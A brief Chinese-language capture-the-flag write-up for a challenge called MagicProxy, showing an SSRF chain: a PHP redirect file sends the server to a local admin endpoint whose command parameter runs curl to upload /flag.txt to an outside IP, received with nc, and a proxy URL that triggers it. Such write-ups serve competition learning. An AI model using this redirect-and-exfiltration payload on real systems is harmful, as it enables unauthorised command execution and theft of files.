# 2022-国赛分区赛-Writeup

## MagicProxy

SSRF打admin执行命令，本地VPS搭一个302跳转来绕waf

```php
<?php
header("Location:http://127.0.0.1:8080/admin?command=curl%20http%3A%2F%2F121.5.169.223%3A39876%20-F%20file%3D%40%2Fflag.txt");
```

然后用proxy接口打过去，本地nc接受flag就行了：

```
/proxy?url=http://121.5.169.223:39354/test.php
```

![image-20220618110428428](2022-%E5%9B%BD%E8%B5%9B%E5%88%86%E5%8C%BA%E8%B5%9B-Writeup.assets/image-20220618110428428.png)